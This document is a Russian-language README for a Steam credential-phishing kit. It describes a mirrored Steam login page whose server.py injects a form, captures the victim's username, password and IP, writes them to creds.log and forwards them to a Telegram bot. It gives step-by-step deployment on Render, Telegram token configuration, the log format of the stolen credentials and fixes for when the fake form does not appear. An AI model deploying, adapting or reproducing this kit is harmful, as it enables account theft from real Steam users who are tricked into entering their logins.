# Steam Login Mirror (Render / any host)

Рабочий зеркальный логин Steam. Кредиты уходят в Telegram + `creds.log`. После отправки жертва видит `next.html` (или редирект на store).

## Что внутри

| файл | зачем |
|------|--------|
| `server.py` | HTTP-сервер (только stdlib). Инжектит форму, ловит POST, шлёт в Telegram |
| `index.html` / `index3dbf.html` | сохранённая страница логина (SingleFile / HTTrack) |
| `next.html` | страница после «входа» |
| `store.steampowered.com/…` | доп. копия login |
| `cdn…` / `community…` | статика (иконки, gif) |
| `Procfile` | для Render / Heroku-like |
| `requirements.txt` | пустой — зависимости не нужны |

## Быстрый старт локально

```bash
python server.py
# открыть http://localhost:8000
```

Порт: `PORT=9000 python server.py`

## Render

1. New → **Web Service**
2. Подключить этот репозиторий / загрузить zip
3. **Runtime**: Python 3
4. **Build Command**: оставить пустым (или `echo ok`)
5. **Start Command**: `python server.py`
6. **Environment** (опционально, иначе берутся значения из кода):

```
TELEGRAM_BOT_TOKEN = 123456:ABC...
TELEGRAM_CHAT_ID   = 123456789
PORT               = 10000   # Render ставит сам
```

7. Deploy. В логах сервиса увидишь `[CREDS] …` и сообщения Telegram.

## Telegram

Токен и chat_id уже прописаны в `server.py` (и дублируются через env).  
Сменить:

```python
TELEGRAM_BOT_TOKEN = "..."
TELEGRAM_CHAT_ID   = "..."
```

или переменные окружения на хосте.

## Как это работает

1. Любой GET на `/`, `/login`, `*index3dbf.html` → отдаётся страница + **инжект** своей формы (имя `username` / `password`).
2. Submit → POST `/next` (fetch + beacon + native form).
3. Сервер пишет в `creds.log`, шлёт HTML-сообщение в Telegram, отдаёт `next.html`.
4. Кнопка «Войти» на хосте больше не «мертвая» — форма живая независимо от того, что SingleFile вырезал React.

## Если форма не видна

Страница уже содержит `steam_react_login_wrap` — инжект пропускается.  
Тогда открой DevTools → Elements и проверь, что есть `#steam_login_form`.  
Принудительно: удали блок с классом `steam_react_login_wrap` из html и перезапусти.

## next.html

После успешного POST отдаётся `next.html`.  
Можно вставить плейсхолдер `egorik_big_balls` — он заменится на логин жертвы.

## Логи

- stdout Render → `[CREDS] {"t":"...","username":"...","password":"...","ip":"..."}`
- файл `creds.log` рядом с `server.py` (на эфемерном диске Render не сохранится после рестарта — смотри stdout / Telegram).

## Частые ошибки

| симптом | причина | фикс |
|---------|---------|------|
| кнопки не работают | старый index без инжекта / кэш | hard refresh, проверь что Start Command = `python server.py` |
| 404 на / | entry не найден | положи `index.html` в корень |
| Telegram молчит | неверный token/chat | проверь env, смотри `[-] Telegram error` в логах |
| порт занят | локально | `PORT=8080 python server.py` |

Готово. Один файл — `server.py`, всё остальное статика.
